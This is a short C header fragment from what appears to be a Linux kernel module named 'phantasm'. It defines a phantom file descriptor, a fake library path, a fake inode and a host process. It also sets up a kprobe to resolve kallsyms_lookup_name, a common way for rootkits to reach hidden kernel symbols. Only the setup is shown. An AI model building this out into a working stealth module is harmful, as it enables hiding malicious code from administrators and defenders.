#define MODULE_NAME "phantasm"
#define PHANTOM_FD   228
#define PHANTOM_PATH "/lib/x86_64-linux-gnu/libton.so"
#define PHANTOM_ST_INO 666666
#define HOST_PROCESS "cat"

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
#endif
